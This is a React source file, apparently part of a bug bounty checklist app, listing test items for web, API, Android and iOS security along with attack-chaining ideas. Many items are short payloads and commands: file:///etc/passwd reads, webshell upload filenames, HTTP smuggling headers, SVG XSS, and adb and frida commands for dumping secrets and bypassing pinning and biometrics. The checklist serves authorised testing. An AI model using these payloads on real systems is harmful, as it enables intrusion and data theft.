    {t:"SSRF via Sentry tunnel: /api/tunnel misconfigured to proxy internal requests",s:"Critical"},
    {t:"file:// protocol: file:///etc/passwd file:///proc/self/environ",s:"High"},
    {t:"DNS rebinding: public→127.0.0.1 rebind after SSRF validation",s:"High"},
  ]},
  {cat:"HTTP Smuggling & Cache", color:T.p, items:[
    {t:"CL.TE: ambiguous Content-Length + Transfer-Encoding headers",s:"Critical"},
    {t:"TE.CL: obfuscated TE header: Transfer-Encoding: xchunked",s:"Critical"},
    {t:"H2.CL / H2.TE: HTTP/2 frontend injection",s:"Critical"},
    {t:"h2csmuggler: H2C upgrade → tunnel HTTP/2 cleartext",s:"Critical"},
    {t:"Cache poisoning: X-Forwarded-Host inject attacker host",s:"High"},
    {t:"Web cache deception: /profile/nonexistent.css → stores profile in cache",s:"High"},
    {t:"DOM-based cache poisoning: unkeyed param in JS → DOM XSS cached",s:"High"},
  ]},
  {cat:"File Upload Attacks", color:T.p, items:[
    {t:"Upload PHP variants: .php .phtml .php5 .php7 .pHp .Php",s:"Critical"},
    {t:"Double extension: shell.php.jpg → executes if misconfigured",s:"Critical"},
    {t:"Null byte: shell.php%00.jpg → bypasses extension check",s:"Critical"},
    {t:"Upload .htaccess: AddType application/x-httpd-php .jpg",s:"Critical"},
    {t:"SVG with embedded JS: <svg><script>alert(1)</script></svg>",s:"High"},
    {t:"ZIP Slip: zip with ../../../path entries → overwrite files",s:"Critical"},
    {t:"ImageMagick RCE (ImageTragick): embedded command in image",s:"Critical"},
    {t:"Path traversal in filename: ../../var/www/html/shell.php",s:"Critical"},
  ]},
];

const API_DEEP = [
  {cat:"API Discovery", color:T.g, items:[
    {t:"kiterunner: kr scan https://api.target.com -w routes-large.kite -x 20",s:"Info"},
    {t:"API versioning fuzz: /api/v{1-20}/ /v{1-20}/",s:"Medium"},
    {t:"Hidden older API version: /v1/ may lack /v3/ security controls",s:"High"},
    {t:"Spring Boot actuator: /actuator/env /actuator/heapdump /actuator/mappings",s:"Critical"},
    {t:"Laravel debug: APP_DEBUG=true → /_ignition/execute-solution (RCE)",s:"Critical"},
    {t:"GraphQL introspection: {__schema{types{name fields{name}}}}",s:"Medium"},
    {t:"Clairvoyance: brute-force schema when introspection disabled",s:"Medium"},
  ]},
  {cat:"OWASP API Top 10 (2023)", color:T.g, items:[
    {t:"API1 BOLA: change user_id/account_id in EVERY endpoint",s:"High"},
    {t:"API2 Broken Auth: bearer absent, token in URL, weak JWT",s:"Critical"},
    {t:"API3 Mass Assignment: add isAdmin/plan/credits to body",s:"Critical"},
    {t:"API4 Rate Limits: OTP brute, password spray, resource exhaustion",s:"High"},
    {t:"API5 BFLA: user calls admin-only /api/admin/deleteUser",s:"Critical"},
    {t:"API6 Business Flow: free trial re-enroll, coupon abuse",s:"High"},
    {t:"API7 SSRF: server fetches URL from API request body",s:"High"},
    {t:"API8 Security Misconfig: CORS *, verbose errors, exposed debug",s:"High"},
    {t:"API9 Improper Inventory: undocumented /v0/ /legacy/ endpoints",s:"High"},
    {t:"API10 Unsafe 3rd-Party: API proxies vulnerable upstream service",s:"High"},
  ]},
  {cat:"GraphQL Expert", color:T.g, items:[
    {t:"Batch DoS: [{\"query\":\"query1\"},{\"query\":\"query2\"}] x100",s:"Medium"},
    {t:"Deep recursion DoS: 100-level deep nested query → OOM",s:"Medium"},
    {t:"Alias bypass: {admin:adminMutation{deleteUser(id:1){success}}}",s:"Critical"},
    {t:"Field suggestion: typo reveals 'Did you mean: adminSecret?'",s:"High"},
    {t:"Subscription auth: unauthenticated ws subscription leaks real-time data",s:"High"},
    {t:"Type confusion: Array where String expected → GraphQL coercion bugs",s:"Medium"},
    {t:"InQL Burp extension: automated scan + injection fuzzing",s:"High"},
    {t:"GraphQL CSRF: state-changing mutation via GET with query param",s:"Medium"},
  ]},
];

const ANDROID_DEEP = [
  {cat:"Setup & Static Analysis", color:T.o, items:[
    {t:"Extract APK: adb shell pm path com.target.app → adb pull",s:"Info"},
    {t:"jadx-gui target.apk → browse Java/Kotlin source",s:"Info"},
    {t:"apktool d target.apk -o ./output → smali + resources",s:"Info"},
    {t:"MobSF ≥ 3.9 AI-assisted scan: docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf",s:"Info"},
    {t:"apkleaks -f target.apk -o leaks.json → URIs, API keys",s:"Critical"},
    {t:"Check exported: AndroidManifest android:exported=true without permission",s:"High"},
    {t:"android:allowBackup=true → adb backup leaks app data",s:"Medium"},
    {t:"android:debuggable=true → attach debugger, extract runtime memory",s:"High"},
    {t:"Flutter/React Native: extract bundled JS or compiled Dart code",s:"Medium"},
    {t:"Scan .so libraries for CVEs: libwebp CVE-2023-4863, libpng",s:"High"},
  ]},
  {cat:"Dynamic Analysis & Frida", color:T.o, items:[
    {t:"Frida server: adb push frida-server /data/local/tmp && chmod 755",s:"Info"},
    {t:"Frida spawn: frida -U -f com.target.app --no-pause -l hooks.js",s:"Info"},
    {t:"objection: android sslpinning disable / android root disable",s:"Info"},
    {t:"Hook crypto: Java.use('javax.crypto.Cipher').doFinal.overload('[B')",s:"High"},
    {t:"fridump.py -U -s com.target.app → dump heap for secrets",s:"High"},
    {t:"adb logcat -v time | grep -iE 'password|token|secret|api|key'",s:"High"},
    {t:"Bypass Play Integrity: MagiskIntegrityFix / Integrity-faker",s:"Info"},
  ]},
  {cat:"Data Storage & WebView", color:T.o, items:[
    {t:"SharedPreferences: adb shell run-as com.target cat shared_prefs/*.xml",s:"High"},
    {t:"SQLite dump: adb shell run-as com.target sqlite3 databases/app.db .dump",s:"High"},
    {t:"Firebase: https://[project].firebaseio.com/.json (no auth?)",s:"Critical"},
    {t:"WebView JS Bridge: addJavascriptInterface RCE pre-API 17",s:"Critical"},
    {t:"setAllowFileAccess(true): file:// URI loads internal app files",s:"High"},
    {t:"Deep link→WebView auth theft: controlable URL loaded with auth headers",s:"Critical"},
  ]},
  {cat:"Intent / IPC / Advanced", color:T.o, items:[
    {t:"Exported activity: adb shell am start -n com.target/.VulnerableActivity",s:"High"},
    {t:"StrandHogg 1+2: task hijacking / reflect task affinity",s:"High"},
    {t:"Content Provider SQL: drozer → run scanner.provider.injection -a com.target",s:"Critical"},
    {t:"Content Provider traversal: content://com.target/../../etc/passwd",s:"Critical"},
    {t:"Tapjacking: qark --exploit-apk → generate overlay attack APK",s:"Medium"},
    {t:"Pending intent hijack: PendingIntent with no action=0 → hijackable",s:"High"},
    {t:"Notification interception: NotificationListenerService reads OTPs",s:"High"},
  ]},
];

const IOS_DEEP = [
  {cat:"Setup & Static", color:T.p, items:[
    {t:"Decrypt IPA: palera1n jailbreak + frida-ios-dump / ipatool",s:"Info"},
    {t:"class-dump -H App -o ./headers → ObjC class/method headers",s:"Info"},
    {t:"AppInfoScanner: python3 app.py ios -i app.ipa → endpoints, API keys",s:"Critical"},
    {t:"Info.plist: URL schemes, ATS NSAllowsArbitraryLoads, permissions",s:"Info"},
    {t:"Binary protections: checksec --file=App → PIE, ARC, stack canary",s:"Medium"},
    {t:"Third-party SDKs: Podfile.lock → audit for vulnerable versions",s:"Medium"},
  ]},
  {cat:"Dynamic & Runtime", color:T.p, items:[
    {t:"Frida: frida -U -n AppName → hook ObjC methods",s:"Info"},
    {t:"objection: ios sslpinning disable + ios keychain dump",s:"Info"},
    {t:"Biometric bypass: objection → ios ui biometrics_bypass",s:"Critical"},
    {t:"LocalAuthentication hook: ObjC.classes.LAContext.evaluatePolicy overload",s:"Critical"},
    {t:"cycript: cycript -p AppName → runtime ObjC patching",s:"High"},
    {t:"iOS data storage: NSUserDefaults, CoreData, Cache.db, Keychain",s:"High"},
  ]},
  {cat:"URL Schemes & Auth", color:T.p, items:[
    {t:"Deep link auth bypass: myapp://dashboard → no auth check",s:"Critical"},
    {t:"URL scheme CSRF: evil website → <a href='target://action'>",s:"High"},
    {t:"OAuth redirect_uri: custom scheme intercepted by attacker app",s:"Critical"},
    {t:"PKCE missing: code_verifier not sent in token exchange",s:"High"},
    {t:"WKWebView allowFileAccessFromFileURLs → file:// cross-origin",s:"High"},
    {t:"Keychain accessibility: kSecAttrAccessibleAlways → no device lock required",s:"Critical"},
    {t:"Session not invalidated on logout: old JWT still valid",s:"High"},
  ]},
];

const CHAINING = [
  {cat:"Critical Bug Chains", color:T.pk, items:[
    {t:"Open redirect + OAuth: steal auth code via redirect to attacker domain",s:"Critical"},
    {t:"XSS + CSRF: use XSS to forge requests bypassing SameSite",s:"Critical"},
    {t:"SSRF + XXE: XXE triggers SSRF to internal services",s:"Critical"},
    {t:"Subdomain takeover + cookie: set .target.com cookie from sub",s:"Critical"},
    {t:"XSS → OAuth Dirty Dancing → steal auth code → ATO ($15k Zoom)",s:"Critical"},
    {t:"JWT kid SQLi + SSRF + metadata = full cloud compromise",s:"Critical"},
    {t:"IDOR + PII: enumerate all user IDs to dump user database",s:"Critical"},
    {t:"Android deep link + WebView + JS bridge = RCE chain",s:"Critical"},
    {t:"Open redirect (Low) → token theft → ATO (Critical): always chain",s:"Critical"},
    {t:"SSRF (Low) → AWS metadata → IAM creds → S3 access (Critical)",s:"Critical"},
    {t:"Blind XSS + ATO: admin cookie stolen → IDOR → full data dump",s:"Critical"},
  ]},
];

// ═══════════════════════════════════════
// MASTER DATA REGISTRY
// ═══════════════════════════════════════
const ALL_DATA = {
  "dashboard": null,
  "bountybuddy": {title:"🎯 BountyBuddy Recon", groups: BOUNTYBUDDY_RECON, color:T.lm, src:"recon.vulninsights.codes"},
  "iwu-method": {title:"📝 InfoSecWriteUps Method", groups: IWU_METHODOLOGY, color:T.cy, src:"infosecwriteups.com"},
  "hacker-wu": {title:"✍️ Writeup Patterns & CVEs", groups: HACKER_WRITEUPS, color:T.pk, src:"hacker-writeups.github.io"},
  "web-recon": {title:"🔍 Web Recon & OSINT", groups: WEB_RECON, color:T.b},
  "web-inject": {title:"💉 Injection Attacks", groups: WEB_INJECT, color:T.r},
  "web-auth": {title:"🔐 Auth & Sessions", groups: WEB_AUTH, color:T.y},
  "web-access": {title:"🚪 Access Control", groups: WEB_ACCESS, color:T.o},
  "web-advanced": {title:"⚡ Advanced Web", groups: WEB_ADVANCED, color:T.p},
  "api-deep": {title:"⚙️ API Testing", groups: API_DEEP, color:T.g},
  "android": {title:"🤖 Android Testing", groups: ANDROID_DEEP, color:T.o},
  "ios": {title:"🍎 iOS Testing", groups: IOS_DEEP, color:T.p},
  "chaining": {title:"🔗 Bug Chaining", groups: CHAINING, color:T.pk},
};

// ═══════════════════════════════════════
// CHECKLIST COMPONENT
// ═══════════════════════════════════════
const Checklist = ({ dataKey }) => {
  const data = ALL_DATA[dataKey];
  const { title, groups, color, src } = data;
  const [checked, setChecked] = useState({});
  const [collapsed, setCollapsed] = useState({});
  const [search, setSearch] = useState("");

  const total = groups.reduce((a, g) => a + g.items.length, 0);
  const done = Object.values(checked).filter(Boolean).length;
  const pct = total > 0 ? Math.round((done / total) * 100) : 0;

  const toggle = useCallback((k) => setChecked(p => ({...p, [k]: !p[k]})), []);
  const toggleCat = (c) => setCollapsed(p => ({...p, [c]: !p[c]}));
  const reset = () => setChecked({});
  const filterItems = (items) =>
    search.trim() ? items.filter(it => it.t.toLowerCase().includes(search.toLowerCase())) : items;

  const isCommand = (t) => t.match(/^[a-z]+ -|^python|^curl|^cat |^echo |^adb |^frida|^nuclei|^ffuf|^subfinder|^amass|^dnsx|^httpx|^nmap|^rustscan|^objection|^sqlmap|^wafw00f|^whois|^dig /);

  return (
    <div className="fi">
      <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start",marginBottom:16}}>
        <div>
          <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:4}}>
            <h2 style={{fontSize:16,fontWeight:700,color:T.text}}>{title}</h2>
            {src && <span className="source-badge" style={{background:color+"20",color,border:`1px solid ${color}44`}}>{src}</span>}
          </div>
          <div style={{display:"flex",alignItems:"center",gap:10}}>
            <div style={{width:180,height:3,background:T.border,borderRadius:2}}>
              <div style={{height:"100%",width:`${pct}%`,background:color,borderRadius:2,transition:"width .3s"}}/>
            </div>
            <span className="mono" style={{fontSize:10,color:T.muted}}>{done}/{total} · {pct}%</span>
            <button className="btn" onClick={reset} style={{fontSize:10,color:T.muted,background:T.card2,border:`1px solid ${T.border}`,borderRadius:4,padding:"2px 7px"}}>Reset</button>
          </div>
        </div>
        <input placeholder="🔍 Filter..." value={search} onChange={e=>setSearch(e.target.value)}
          style={{background:T.card2,border:`1px solid ${T.border}`,borderRadius:6,padding:"5px 10px",color:T.text,fontSize:12,fontFamily:"IBM Plex Sans",width:170,outline:"none"}}/>
      </div>

      {groups.map(g => {
        const filtered = filterItems(g.items);
        if (!filtered.length) return null;
        const catDone = g.items.filter((_,i) => checked[`${g.cat}-${i}`]).length;
        const isOpen = !collapsed[g.cat];
        const gc = g.color || color;
        return (
          <div key={g.cat} style={{background:T.card,border:`1px solid ${T.border}`,borderRadius:8,overflow:"hidden",marginBottom:8}}>
            <div onClick={()=>toggleCat(g.cat)} style={{padding:"8px 14px",background:T.card2,display:"flex",justifyContent:"space-between",alignItems:"center",cursor:"pointer",borderBottom:isOpen?`1px solid ${T.border}`:"none"}}>
              <div style={{display:"flex",alignItems:"center",gap:8}}>
                <span style={{color:T.dim,fontSize:9}}>{isOpen?"▼":"▶"}</span>
                <span style={{fontSize:10.5,fontWeight:700,color:gc,textTransform:"uppercase",letterSpacing:.8}}>{g.cat}</span>
                {g.src && <span className="source-badge" style={{background:gc+"15",color:gc,border:`1px solid ${gc}30`}}>{g.src}</span>}
              </div>
              <div style={{display:"flex",alignItems:"center",gap:8}}>
                <div style={{width:50,height:2,background:T.border,borderRadius:1}}>
                  <div style={{height:"100%",width:`${(catDone/g.items.length)*100}%`,background:gc,borderRadius:1,transition:"width .3s"}}/>
                </div>
                <span className="mono" style={{fontSize:9,color:T.muted}}>{catDone}/{g.items.length}</span>
              </div>
            </div>
            {isOpen && filtered.map((item,i) => {
              const realIdx = g.items.indexOf(item);
              const k = `${g.cat}-${realIdx}`;
              const cmd = isCommand(item.t);
              return (
                <div key={k} className="row" onClick={()=>toggle(k)}
                  style={{display:"flex",alignItems:"flex-start",gap:9,padding:"6px 14px",borderBottom:`1px solid ${T.border}18`,cursor:"pointer"}}>
                  <div style={{width:14,height:14,borderRadius:3,border:`1.5px solid ${checked[k]?gc:T.border}`,background:checked[k]?gc+"20":"transparent",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,transition:"all .12s",marginTop:2}}>
                    {checked[k] && <svg width="8" height="6"><polyline points="1,3 3,5.5 7,1" stroke={gc} strokeWidth="1.8" fill="none"/></svg>}
                  </div>
                  <span style={{flex:1,fontSize:11.5,color:checked[k]?T.muted:T.text,textDecoration:checked[k]?"line-through":"none",lineHeight:1.6,fontFamily:cmd?"'IBM Plex Mono',monospace":"'IBM Plex Sans',sans-serif"}}>{item.t}</span>
                  <span className="tag" style={{background:SEV[item.s]?.b,color:SEV[item.s]?.c,flexShrink:0,marginTop:2}}>{item.s}</span>
                </div>
              );
            })}
          </div>
        );
      })}
    </div>
  );
};

// ═══════════════════════════════════════
// DASHBOARD
// ═══════════════════════════════════════
const Dashboard = () => {
  const totalAll = Object.entries(ALL_DATA).filter(([k])=>k!=="dashboard").reduce((a,[,d])=>a+d.groups.reduce((b,g)=>b+g.items.length,0),0);
  const newSources = ["bountybuddy","iwu-method","hacker-wu"].reduce((a,k)=>a+ALL_DATA[k].groups.reduce((b,g)=>b+g.items.length,0),0);

  return (
    <div className="fi">
      <div style={{marginBottom:20,paddingBottom:16,borderBottom:`1px solid ${T.border}`}}>
        <div style={{display:"flex",gap:10,alignItems:"center",marginBottom:5}}>
          <span style={{fontSize:18,fontWeight:700}}>🎯 Bug Bounty Ultra Workspace v4</span>
          <span className="chip" style={{background:T.gd,color:T.g,border:`1px solid ${T.g}44`,fontSize:10}}>DEEP EDITION 2025–26</span>
        </div>
        <p style={{color:T.muted,fontSize:12}}>Sources: recon.vulninsights.codes (BountyBuddy) · hacker-writeups.github.io · infosecwriteups.com · HackTricks · OWASP MASTG · HackerOne Disclosures · PortSwigger · NahamSec · Oversecured</p>
      </div>

      {/* Stats */}
      <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:10,marginBottom:14}}>
        {[
          {label:"Total Checks",val:totalAll,c:T.g,icon:"∑"},
          {label:"New from Sites",val:newSources,c:T.lm,icon:"🆕"},
          {label:"Checklist Modules",val:Object.keys(ALL_DATA).filter(k=>k!=="dashboard").length,c:T.b,icon:"📋"},
          {label:"Vulnerability Classes",val:"50+",c:T.r,icon:"🎯"},
        ].map(s=>(
          <div key={s.label} style={{background:T.card,border:`1px solid ${T.border}`,borderRadius:8,padding:"12px 14px"}}>
            <div style={{fontSize:16,marginBottom:2}}>{s.icon}</div>
            <div className="mono" style={{fontSize:22,fontWeight:700,color:s.c}}>{s.val}</div>
            <div style={{fontSize:10.5,color:T.muted,marginTop:1}}>{s.label}</div>
          </div>
        ))}
      </div>

      {/* Source sites info */}
      <div style={{background:T.card,border:`1px solid ${T.lm}44`,borderRadius:8,padding:14,marginBottom:12}}>
        <div style={{fontSize:10.5,fontWeight:700,color:T.lm,textTransform:"uppercase",letterSpacing:1,marginBottom:10}}>🆕 Integrated From Your Sites</div>
        <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:10}}>
          {[
            {name:"BountyBuddy",url:"recon.vulninsights.codes",c:T.lm,desc:"Terminal-ready recon commands. Passive/active subdomain enum, ASN/CIDR mapping, WAF/CDN detection, staging discovery, API & admin panel hunting.",count:ALL_DATA["bountybuddy"].groups.reduce((a,g)=>a+g.items.length,0)},
            {name:"Hacker Write-Ups",url:"hacker-writeups.github.io",c:T.pk,desc:"Real writeup patterns from Redwan Ahmed & community: CVE spraying, DEFCON32 methodology, real bounty-earning bug patterns with exact workflows.",count:ALL_DATA["hacker-wu"].groups.reduce((a,g)=>a+g.items.length,0)},
            {name:"InfoSec WriteUps",url:"infosecwriteups.com",c:T.cy,desc:"URL/JS recon patterns, live host scanning, high-value vuln writeups (Zoom $15k, SharePoint XXE, Cypher injection), and 5-step manual testing essentials.",count:ALL_DATA["iwu-method"].groups.reduce((a,g)=>a+g.items.length,0)},
          ].map(s=>(
            <div key={s.name} style={{background:T.bg,border:`1px solid ${T.border}`,borderRadius:6,padding:10}}>
              <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
                <span style={{fontSize:12,fontWeight:600,color:s.c}}>{s.name}</span>
                <span className="mono" style={{fontSize:11,color:s.c}}>{s.count} checks</span>
              </div>
              <div style={{fontSize:10,color:T.muted,lineHeight:1.55,marginBottom:5}}>{s.desc}</div>
              <a href={`https://${s.url}`} target="_blank" rel="noreferrer" style={{fontSize:9.5,color:s.c,fontFamily:"IBM Plex Mono",textDecoration:"none"}}>↗ {s.url}</a>
            </div>
          ))}
        </div>
      </div>

      {/* All modules overview */}
      <div style={{background:T.card,border:`1px solid ${T.border}`,borderRadius:8,padding:14,marginBottom:12}}>
        <div style={{fontSize:10.5,fontWeight:700,color:T.muted,textTransform:"uppercase",letterSpacing:1,marginBottom:10}}>All Checklist Modules</div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:4}}>
          {Object.entries(ALL_DATA).filter(([k])=>k!=="dashboard").map(([k,v])=>{
            const cnt = v.groups.reduce((a,g)=>a+g.items.length,0);
            const isNew = ["bountybuddy","iwu-method","hacker-wu"].includes(k);
            return (
              <div key={k} style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"4px 8px",borderRadius:5,background:isNew?v.color+"08":T.bg,border:`1px solid ${isNew?v.color+"33":T.border}`}}>
                <div style={{display:"flex",alignItems:"center",gap:6}}>
                  <span style={{fontSize:11.5,color:T.text}}>{v.title}</span>
                  {isNew && <span className="tag" style={{background:T.lm+"20",color:T.lm,fontSize:8}}>NEW</span>}
                </div>
                <div style={{display:"flex",alignItems:"center",gap:6}}>
                  {v.src && <span style={{fontSize:9,color:T.dim,fontFamily:"IBM Plex Mono"}}>{v.src.split(".")[0]}</span>}
                  <span className="mono" style={{fontSize:10,color:v.color}}>{cnt}</span>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Workflow */}
      <div style={{background:T.card,border:`1px solid ${T.border}`,borderRadius:8,padding:14}}>
        <div style={{fontSize:10.5,fontWeight:700,color:T.muted,textTransform:"uppercase",letterSpacing:1,marginBottom:10}}>Attack Workflow · 12 Steps</div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:3}}>
          {[
            ["01","Scope + Rules","→ define in-scope assets",T.b],
            ["02","Passive Recon + OSINT","→ BountyBuddy Phase 1",T.lm],
            ["03","Active Recon + Brute Force","→ BountyBuddy Phase 2",T.lm],
            ["04","ASN/IP/CIDR Mapping","→ BountyBuddy Phase 3",T.lm],
            ["05","URL + JS + Param Harvest","→ IWU gau/katana/gf",T.cy],
            ["06","WAF/CDN + Tech Stack","→ BountyBuddy Phase 4",T.lm],
            ["07","Auth + JWT + OAuth","→ Auth checklist",T.y],
            ["08","IDOR + Access Control","→ Access checklist",T.o],
            ["09","Injection + Advanced","→ Injection checklist",T.r],
            ["10","Business Logic","→ Access+Logic checklist",T.o],
            ["11","CVE Spraying","→ Writeup CVE module",T.pk],
            ["12","Bug Chaining + PoC + Report","→ Chain module",T.pk],
          ].map(([n,l,d,c])=>(
            <div key={n} style={{display:"flex",alignItems:"center",gap:8,padding:"3px 6px",borderRadius:4,background:T.bg}}>
              <span className="mono" style={{fontSize:10,color:c,minWidth:20}}>{n}</span>
              <span style={{fontSize:11,color:T.text}}>{l}</span>
              <span style={{fontSize:10,color:T.dim,marginLeft:"auto"}}>{d}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

// ═══════════════════════════════════════
// NAV + APP SHELL
// ═══════════════════════════════════════
const NAVS = [
  {id:"dashboard",icon:"⬛",label:"Dashboard",group:"Overview"},
  {id:"bountybuddy",icon:"🎯",label:"BountyBuddy Recon",group:"🆕 New Sources"},
  {id:"iwu-method",icon:"📝",label:"InfoSecWriteUps",group:"🆕 New Sources"},
  {id:"hacker-wu",icon:"✍️",label:"Hacker WriteUps",group:"🆕 New Sources"},
  {id:"web-recon",icon:"🔍",label:"Web Recon",group:"Web"},
  {id:"web-inject",icon:"💉",label:"Injection",group:"Web"},
  {id:"web-auth",icon:"🔐",label:"Auth & Sessions",group:"Web"},
  {id:"web-access",icon:"🚪",label:"Access Control",group:"Web"},
  {id:"web-advanced",icon:"⚡",label:"Advanced Web",group:"Web"},
  {id:"api-deep",icon:"⚙️",label:"API Testing",group:"API"},
  {id:"android",icon:"🤖",label:"Android",group:"Mobile"},
  {id:"ios",icon:"🍎",label:"iOS",group:"Mobile"},
  {id:"chaining",icon:"🔗",label:"Bug Chaining",group:"Strategy"},
];

const GROUPS = [...new Set(NAVS.map(n=>n.group))];

export default function App() {
  const [page, setPage] = useState("dashboard");
  const totalAll = Object.entries(ALL_DATA).filter(([k])=>k!=="dashboard").reduce((a,[,d])=>a+d.groups.reduce((b,g)=>b+g.items.length,0),0);

  return (
    <>
      <style>{css}</style>
      <div style={{display:"flex",minHeight:"100vh"}}>
        {/* SIDEBAR */}
        <div style={{width:210,background:T.surf,borderRight:`1px solid ${T.border}`,padding:"14px 8px",flexShrink:0,display:"flex",flexDirection:"column",position:"sticky",top:0,height:"100vh",overflowY:"auto"}}>
          <div style={{padding:"0 4px 12px",marginBottom:6,borderBottom:`1px solid ${T.border}`}}>
            <div className="mono" style={{fontSize:11,color:T.g,marginBottom:1}}>
              <span className="blink">▶</span> BB_WORKSPACE_V4
            </div>
            <div style={{fontSize:9,color:T.dim,fontFamily:"IBM Plex Mono"}}>{totalAll} checks · 3 new sources</div>
          </div>
          {GROUPS.map(grp=>(
            <div key={grp} style={{marginBottom:4}}>
              <div style={{fontSize:8.5,fontWeight:700,color:grp.includes("🆕")?T.lm:T.dim,textTransform:"uppercase",letterSpacing:.8,padding:"3px 4px 2px",marginTop:2}}>{grp}</div>
              {NAVS.filter(n=>n.group===grp).map(n=>(
                <div key={n.id} className={`nav ${page===n.id?"on":""}`} onClick={()=>setPage(n.id)}>
                  <span style={{fontSize:12}}>{n.icon}</span>
                  <span style={{fontSize:11.5}}>{n.label}</span>
                  {["bountybuddy","iwu-method","hacker-wu"].includes(n.id) && (
                    <span className="tag" style={{background:T.lm+"20",color:T.lm,marginLeft:"auto",fontSize:8}}>NEW</span>
                  )}
                </div>
              ))}
            </div>
          ))}
          <div style={{marginTop:"auto",padding:"8px 4px 0",borderTop:`1px solid ${T.border}`}}>
            <div style={{fontSize:8.5,color:T.dim,textTransform:"uppercase",letterSpacing:.8,marginBottom:4}}>Sources</div>
            {["recon.vulninsights.codes","hacker-writeups.github.io","infosecwriteups.com","hackerone.com/hacktivity","book.hacktricks.xyz","portswigger.net","owasp.org/MASTG","nahamsec.com"].map(s=>(
              <div key={s} className="mono" style={{fontSize:9,color:T.dim,padding:"1px 0",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>→ {s}</div>
            ))}
          </div>
        </div>

        {/* CONTENT */}
        <div style={{flex:1,padding:"20px 24px",overflowY:"auto",minWidth:0}}>
          {page==="dashboard" ? <Dashboard/> : <Checklist dataKey={page}/>}
        </div>
      </div>
    </>
  );
}
